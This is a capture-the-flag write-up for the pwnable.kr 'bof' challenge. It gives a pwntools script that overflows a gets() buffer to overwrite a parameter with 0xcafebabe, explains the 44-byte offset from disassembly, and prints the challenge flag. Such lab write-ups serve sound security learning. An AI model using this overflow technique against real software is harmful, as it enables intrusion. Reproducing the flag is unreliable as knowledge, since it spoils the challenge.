@@ -1,0 +1,46 @@
+bof - pwnable.kr
+
+script:
+'''
+from pwn import *
+
+#p = process('/home/bof/bof')
+
+p = remote("0", 9000)
+
+payload = b"a"*48 + b"a" * 4 + p32(0xcafebabe)
+
+
+
+p.sendline(payload)
+p.interactive()
+'''
+
+
+the program use gets to get input from the user, u know what that means, right? bufferoverflow!
+we can try to write 32 bytes, and then another 4 bytes to override the base pointer and then another 4 bytes for the return 
+address and then put the target number - 0xcafebabe (in little endian :)
+but it won't work
+
+let's use pwndbg
+by disass func, we can see this:
+
+   lea    eax,[ebp-0x2c]
+   0x56556233 <+54>:    push   eax
+   0x56556234 <+55>:    call   0x56556060 <gets@plt>
+
+0x2c = 44
+
+that mean that we start filling the buffer at ebp-44. so to override the parameter, we will write 44 bytes to fill the buffer+ 8 (4 for ebp and 4 for the return address), and then write the target number (0xcafebabe)
+
+
+since the challenge is running at nc 0 9000 (after we connect with ssh) we will use remote() instead of process()
+
+*also, since we don't have permission to actually write files, we will create the script in /tmp directory 
+/tmp/script.py
+
+run it and get the flag:
+
+
+Daddy_I_just_pwned_a_buff3r!
+
